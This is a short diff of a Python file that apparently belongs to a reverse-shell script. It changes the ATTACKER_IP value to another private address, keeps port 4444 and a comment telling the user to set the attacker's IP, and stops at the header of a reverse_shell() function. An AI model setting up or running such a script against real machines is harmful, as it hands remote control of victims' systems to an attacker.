@@ -5,7 +5,7 @@ import threading
 import time
 import sys
 
-ATTACKER_IP = "10.11.73.46"  # change this to ur attacker's ip!
+ATTACKER_IP = "192.168.56.1"  # change this to ur attacker's ip!
 ATTACKER_PORT = 4444
 
 def reverse_shell():
